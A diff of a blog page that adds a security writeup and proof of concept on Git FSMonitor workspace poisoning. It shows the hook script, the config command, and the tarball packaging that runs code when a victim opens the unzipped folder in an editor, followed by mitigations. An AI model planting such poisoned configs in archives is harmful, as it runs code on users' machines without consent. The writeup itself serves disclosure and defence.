@@ -2,31 +2,131 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Local Code Execution via Git Workspace Poisoning (FSMonitor) | X3r0Day</title>
-    <meta name="description" content="A technical writeup on local code execution through poisoned Git FSMonitor configuration in editors and shell prompts.">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#1c1d20">
+    <title>Git FSMonitor: workspace poisoning | X3r0Day</title>
+    <meta name="description" content="When Git-aware editors trust a poisoned workspace, a routine status check can become local code execution.">
+    <meta name="author" content="X3r0Day">
+    <meta property="og:title" content="Git FSMonitor: workspace poisoning">
+    <meta property="og:description" content="When Git-aware editors trust a poisoned workspace, a routine status check can become local code execution.">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://x3r0day.me/blog/fsmonitor-lrce/">
     <link rel="canonical" href="https://x3r0day.me/blog/fsmonitor-lrce/">
-    <link rel="stylesheet" href="/style.css">
-    <link rel="stylesheet" href="/blog/blog.css">
-    <script defer src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+    <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml">
+    <link rel="preload" href="/assets/fonts/fragment-mono-latin.woff2" as="font" type="font/woff2" crossorigin>
+    <link rel="preload" href="/assets/fonts/silkscreen-400-latin.woff2" as="font" type="font/woff2" crossorigin>
+    <link rel="stylesheet" href="/style.css?v=b345641a10a2">
+    <link rel="stylesheet" href="/blog/blog.css?v=e6cf661b0258">
+    <script defer src="/script.js?v=31e9c72a52f7"></script>
     <script defer src="/blog/blog.js"></script>
 </head>
-<body class="blog-page">
-    <main class="window outset blog-window">
-        <div class="title-bar">
-            <div class="title-text"><span aria-hidden="true">📝</span> FSMonitor LRCE.md - Notepad</div>
-        </div>
-        <nav class="menu-bar" aria-label="Site navigation">
-            <a href="/blog/">All posts</a>
-            <a href="/">Home</a>
-        </nav>
-        <article class="inset" id="notepad-content" aria-live="polite" aria-busy="true">
-            <p>Loading post...</p>
-            <noscript><p>Enable JavaScript to view the formatted post, or read the Markdown file below.</p></noscript>
-        </article>
-        <footer class="menu-bar">
-            <a id="post-source" href="/blog/writeups/FSMonitor%20LRCE.md">Read Markdown</a>
-        </footer>
-    </main>
+<body class="reading-page">
+<a class="skip-link" href="#main">Skip to content</a>
+<header class="site-header"><div class="header-inner wrap">
+    <a class="brand" href="/" aria-label="X3r0Day home">X3r0Day<span class="brand-suffix">Research &amp; notes</span></a>
+    <nav class="site-nav" id="site-nav" aria-label="Main navigation">
+        <a href="/">Research</a>
+        <a href="/blog/" aria-current="page">Writeups</a>
+        <a href="/#tools">Projects</a><a href="/#about">About</a>
+    </nav>
+    <div class="header-actions"><button class="search-trigger" type="button" aria-label="Search research" aria-controls="site-search" hidden><svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.4" aria-hidden="true"><circle cx="10.5" cy="10.5" r="6.5"/><path d="m16 16 5 5"/></svg></button><button class="menu-toggle" aria-controls="site-nav" aria-expanded="false" hidden>Menu <span aria-hidden="true">+</span></button></div>
+</div></header>
+<div class="reading-progress" aria-hidden="true"></div>
+<main id="main" class="article-page wrap">
+    <header class="article-header"><a class="back-link" href="/blog/"><span aria-hidden="true">←</span> All writing</a><div class="article-meta"><span class="topic-tag blue">Developer tooling</span><span>May 2026</span><span>4 min read</span></div><h1>Git FSMonitor: workspace poisoning</h1><p class="article-dek">When Git-aware editors trust a poisoned workspace, a routine status check can become local code execution.</p><div class="article-byline"><span class="author-mark" aria-hidden="true">x3</span><span>Words &amp; research by <strong>X3r0Day</strong></span><a class="source-link" href="/blog/writeups/FSMonitor%20LRCE.md">View Markdown ↗</a></div></header>
+    <div class="article-resources"><a href="https://xerosec.medium.com/local-code-execution-via-git-workspace-poisoning-fsmonitor-7041a2560395">Original publication ↗</a></div>
+    <div class="article-layout"><aside class="article-sidebar"><details class="toc" open><summary>In this article <span aria-hidden="true">⌄</span></summary><nav aria-label="Table of contents"><a href="#how-the-attack-works">How the Attack Works</a><a href="#setup-instructions">Setup Instructions</a><a href="#packaging-the-exploit-for-victims">Packaging the Exploit for Victims</a><a href="#the-victim-s-experience-zero-click-triggers">The Victim&#39;s Experience (Zero-Click Triggers)</a><a href="#how-to-protect-yourself">How to Protect Yourself</a><a href="#references-further-reading">References &amp; Further Reading</a><a href="#disclaimer">Disclaimer</a></nav></details></aside><article class="prose" id="post-content"><p>This repo contains a Proof of Concept (PoC) showing how a malicious <code>.git/config</code> file can lead to local code execution. </p>
+<p>By abusing the <code>core.fsmonitor</code> setting, an attacker can run custom scripts when a user simply opens a downloaded project in a modern editor (like VS Code or Emacs) or navigates into the folder using a Git-aware shell prompt. </p>
+<p><strong>Important Context:</strong> This is not a Remote Code Execution (RCE) bug in Git. Git is doing exactly what it was built to do: trust the local <code>.git</code> folder. The real security risk comes from third-party tools (IDEs, text editors, and shell plugins) that automatically run Git commands against untrusted folders without asking the user first.</p>
+<h2 id="how-the-attack-works">How the Attack Works</h2>
+<ul>
+<li><strong>Attack Vector:</strong> A poisoned <code>.git/config</code> file with <code>core.fsmonitor</code> pointing to a local script.</li>
+<li><strong>Trigger:</strong> Any Git command that checks the file system (like <code>git status</code> or <code>git log</code>).</li>
+<li><strong>Impact:</strong> Code execution under the current user&#39;s privileges.</li>
+<li><strong>The Catch:</strong> This attack <strong>does not work over <code>git clone</code></strong>. Git actively strips dangerous hooks and configs during a clone. An attacker has to trick the victim into downloading and unzipping an archive (like a <code>.tar.gz</code> or <code>.zip</code>).</li>
+</ul>
+<h2 id="setup-instructions">Setup Instructions</h2>
+<h3 id="step-1-create-the-project">Step 1: Create the Project</h3>
+<pre><code class="language-bash">mkdir -p git-fsmonitor-exploit
+cd git-fsmonitor-exploit
+git init
+mkdir -p execution
+</code></pre>
+<h3 id="step-2-create-the-payload">Step 2: Create the Payload</h3>
+<p>Create a file at <code>.git/hooks/fsmonitor-watchman</code>:</p>
+<pre><code class="language-bash">#!/bin/bash
+
+# Log proof that the script ran
+whoami &gt;&gt; &quot;$(pwd)/execution/executed.txt&quot;
+echo &quot;Exploit executed at: $(date)&quot; &gt;&gt; &quot;$(pwd)/execution/executed.txt&quot;
+
+# Git requires this specific output format to not throw an error
+echo &quot;2&quot;
+printf &quot;\0&quot;
+</code></pre>
+<p><em>Note: This specific payload uses bash, so it targets macOS and Linux. An attacker targeting Windows users would just point the config to a <code>.bat</code> file or a compiled executable.</em></p>
+<p>Make the script executable:</p>
+<pre><code class="language-bash">chmod +x .git/hooks/fsmonitor-watchman
+</code></pre>
+<h3 id="step-3-configure-git">Step 3: Configure Git</h3>
+<p>Tell Git to use our script as the file system monitor:</p>
+<pre><code class="language-bash">git config core.fsmonitor &#39;.git/hooks/fsmonitor-watchman&#39;
+</code></pre>
+<h3 id="step-4-test-it-locally">Step 4: Test It Locally</h3>
+<p>Run a basic read-only Git command:</p>
+<pre><code class="language-bash">git status
+</code></pre>
+<p>Check the log file:</p>
+<pre><code class="language-bash">cat execution/executed.txt
+</code></pre>
+<p>You should see your username and the current timestamp.</p>
+<h2 id="packaging-the-exploit-for-victims">Packaging the Exploit for Victims</h2>
+<p>Because <code>git clone</code> is safe, attackers rely on social engineering to deliver this. They package the repo into a zip or tarball.</p>
+<p>From the parent directory, create the archive. Make sure to include the hidden <code>.git</code> folder (do not use <code>*</code> as it usually skips hidden files):</p>
+<pre><code class="language-bash">tar -czvf git-fsmonitor-exploit.tar.gz -C git-fsmonitor-exploit .
+</code></pre>
+<h2 id="the-victim-s-experience-zero-click-triggers">The Victim&#39;s Experience (Zero-Click Triggers)</h2>
+<p>When a victim downloads and unzips the file, they don&#39;t even need to type a Git command to get hacked. </p>
+<p>If they open the folder in an editor like VS Code or GNU Emacs, the editor&#39;s built-in version control integration automatically runs Git commands (like <code>git status</code> or <code>git rev-parse</code>) in the background to populate the UI. For instance, VS Code&#39;s built-in Git extension continuously polls the repository, and Emacs triggers <code>vc-refresh-state</code> upon opening a file. The exact same thing happens if the victim uses a shell prompt that displays the current Git branch.</p>
+<p>The payload runs instantly, with no warnings.</p>
+<p><em>Note: <code>core.fsmonitor</code> is very quiet because it triggers on read-only commands, but attackers can do the exact same thing using other config options like <code>core.pager</code>, <code>core.editor</code>, or <code>core.sshCommand</code>.</em></p>
+<h2 id="how-to-protect-yourself">How to Protect Yourself</h2>
+<p><strong>For developers:</strong></p>
+<p>The simplest advice is the best here: be careful with zipped code you find online. If you need to unzip a project you don&#39;t entirely trust, open the <code>.git/config</code> file in a basic text editor first to see if anything looks weird. Do this <em>before</em> you open the whole folder in VS Code or navigate to it in your terminal, as that might trigger the hidden script.</p>
+<p>You might be wondering about Git&#39;s <code>safe.directory</code> feature. Sadly, it won&#39;t save you here. When you unzip an archive, your computer makes you the owner of all the files inside. Because you are the owner of the <code>.git</code> folder, Git assumes you trust it, and the security check gets skipped.</p>
+<p>If you don&#39;t actually need the FSMonitor feature (most people don&#39;t unless they work on massive repositories), you can just turn it off for good. Run these two commands to stop this attack from working on your machine:</p>
+<pre><code class="language-bash">git config --global core.useBuiltinFSMonitor true
+git config --global core.fsmonitor &quot;&quot;
+</code></pre>
+<p><strong>For IDE / Tool Developers:</strong>
+If you&#39;re building an editor extension or an IDE feature that runs Git commands under the hood, you need to explicitly disable dangerous config flags on the fly. </p>
+<p>For instance, this is how you&#39;d run a <code>git status</code> safely:</p>
+<pre><code class="language-bash">git -c core.fsmonitor=false -c core.pager=cat status
+</code></pre>
+<p>In a VS Code extension (Node/TypeScript), you&#39;d inject those arguments directly into your spawn call:</p>
+<pre><code class="language-typescript">const args = [&#39;-c&#39;, &#39;core.fsmonitor=false&#39;, &#39;-c&#39;, &#39;core.pager=cat&#39;, &#39;status&#39;];
+cp.spawn(&#39;git&#39;, args, { cwd: repoPath });
+</code></pre>
+<p>And if you&#39;re writing Emacs Lisp (like patching <code>vc-git.el</code>), you can pass the flags right into the process call:</p>
+<pre><code class="language-lisp">(apply #&#39;process-file vc-git-program infile buffer nil
+       &quot;--no-pager&quot; &quot;-c&quot; &quot;core.fsmonitor=false&quot;
+       command args)
+</code></pre>
+<h2 id="references-further-reading">References &amp; Further Reading</h2>
+<p>If you want to dig deeper into how this works, check these out:</p>
+<ul>
+<li><strong><a href="https://www.cobalt.io/blog/red-team-technique-exploiting-git-fsmonitor-for-initial-access">Exploiting Git FSMonitor for Initial Access</a></strong> (Cobalt Security, Dec 2025): A great walkthrough on weaponizing <code>core.fsmonitor</code> for initial access via IDEs.</li>
+<li><strong><a href="https://www.bleepingcomputer.com/news/security/claude-ai-finds-vim-emacs-rce-bugs-that-trigger-on-file-open/">Claude AI finds Vim, Emacs RCE bugs...</a></strong> (BleepingComputer, March 2026): Covers how opening a file in Emacs triggers <code>vc-refresh-state</code> and fires the payload without warning. <em>(<a href="https://github.com/califio/publications/blob/main/MADBugs/vim-vs-emacs-vs-claude/Emacs.md">Original technical writeup here</a>)</em></li>
+<li><strong><a href="https://github.com/justinsteven/advisories/blob/main/2022_git_buried_bare_repos_and_fsmonitor_various_abuses.md">Buried Bare Repos &amp; FSMonitor Abuses</a></strong> (Justin Steven, 2022): The original advisory that documented <code>core.fsmonitor</code> as an exploit vector (along with the corresponding <a href="https://github.blog/2022-04-12-git-security-vulnerability-announced/">GitHub blog post</a>).</li>
+<li><strong><a href="https://git-scm.com/docs/git-fsmonitor--daemon">Git&#39;s fsmonitor daemon docs</a></strong>: Official documentation on what this command is <em>actually</em> supposed to do before people started abusing it.</li>
+</ul>
+<h2 id="disclaimer">Disclaimer</h2>
+<p>This proof of concept is for security testing and educational use only. Do not use this to attack systems you do not own.</p>
+</article></div>
+    <div class="article-end"><span>Thanks for reading.</span><a class="text-link" href="/blog/">Back to all writing <span aria-hidden="true">↗</span></a></div>
+    <a class="next-post iris" href="/blog/emacs-dir-locals-code-execution/"><div><span>Keep reading</span><h2>Emacs: code execution on file open</h2></div><span aria-hidden="true">↗</span></a>
+</main>
+<footer class="site-footer wrap"><a class="footer-name" href="/">X3r0Day<span> / independent research</span></a><div><a href="https://github.com/X3r0Day">GitHub ↗</a><a href="https://x.com/X3r0DaySec">X / Twitter ↗</a><a href="mailto:cr4n@duck.com">Email ↗</a></div><span>© 2026</span></footer>
+<dialog id="site-search" class="search-dialog" aria-labelledby="search-title"><div class="search-dialog-heading"><h2 id="search-title">Search the index.</h2><button type="button" class="search-close" aria-label="Close search">×</button></div><label class="sr-only" for="site-query">Search research and projects</label><input id="site-query" type="search" placeholder="A finding, a tool, a question…" autocomplete="off" autofocus><p class="search-status" role="status"></p><ul class="search-results"><li data-search="emacs: code execution on file open an ordinary file. an unexpected execution path. how emacs directory locals bypassed the very check meant to keep them safe. editor security"><a href="/blog/emacs-dir-locals-code-execution/"><span>Editor security</span><strong>Emacs: code execution on file open</strong><span aria-hidden="true">↗</span></a></li><li data-search="hermes agent: unauthenticated rce an exposed session token in hermes agent turns a dashboard visit into unauthenticated code execution and credential access. application security"><a href="/blog/hermes-agent-unauth-rce/"><span>Application security</span><strong>Hermes Agent: unauthenticated RCE</strong><span aria-hidden="true">↗</span></a></li><li data-search="bun install: arbitrary file write a dependency alias takes bun outside node_modules. arbitrary file writes, even with lifecycle scripts disabled. supply chain"><a href="/blog/bun-file-traversal/"><span>Supply chain</span><strong>Bun install: arbitrary file write</strong><span aria-hidden="true">↗</span></a></li><li data-search="git fsmonitor: workspace poisoning when git-aware editors trust a poisoned workspace, a routine status check can become local code execution. developer tooling"><a href="/blog/fsmonitor-lrce/"><span>Developer tooling</span><strong>Git FSMonitor: workspace poisoning</strong><span aria-hidden="true">↗</span></a></li><li data-search="insect v2 an earlier red-team project revisiting 1990s malware, preserved from the original research collection. red-team research"><a href="https://github.com/X3r0Day/FUD-C2-Framework.git"><span>Red-team research</span><strong>Insect V2</strong><span aria-hidden="true">↗</span></a></li><li data-search="workspace trust &amp; python .pth files the research collection covering vs code python initialization and git fsmonitor workspace poisoning. developer tooling"><a href="https://github.com/X3r0Day/X3r0Day-Research"><span>Developer tooling</span><strong>Workspace trust &amp; Python .pth files</strong><span aria-hidden="true">↗</span></a></li><li data-search="a data-exposure disclosure to cert-in a coordinated report concerning exposed personal data on an indian government website. responsible disclosure"><a href="https://x.com/X3r0DaySec/status/2063002547561115826"><span>Responsible disclosure</span><strong>A data-exposure disclosure to CERT-In</strong><span aria-hidden="true">↗</span></a></li></ul><p class="search-empty" hidden>No matches. Try a different word.</p><div class="search-dialog-foot"><span>Research, not a search engine.</span><span>Esc to close</span></div></dialog>
 </body>
 </html>
